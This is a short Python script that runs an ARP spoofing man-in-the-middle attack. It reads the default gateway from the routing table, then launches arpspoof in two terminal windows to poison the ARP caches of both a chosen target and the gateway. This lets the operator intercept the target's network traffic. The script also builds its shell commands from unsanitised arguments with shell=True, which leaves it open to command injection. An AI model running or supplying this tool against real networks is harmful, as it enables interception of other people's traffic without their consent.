import subprocess
import sys
import re
import platform

def main():
    print("ARP Spoofing: "+sys.argv[1]+" on "+ sys.argv[2])
    target_ip = sys.argv[1]
    wlan_interface = sys.argv[2]
    route_default_result = subprocess.check_output(["ip","route"]).decode("utf-8")
    gateway = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", route_default_result).group(0)
    subprocess.call("terminator --profile=Non-Persistant --command=\"arpspoof -i "+wlan_interface+" -t "+target_ip+" "+gateway+"\"", shell = "True")
    subprocess.call("terminator --profile=Non-Persistant --command=\"arpspoof -i "+wlan_interface+" -t "+gateway+" "+target_ip+"\"", shell = "True")


if __name__ == '__main__':
    main()

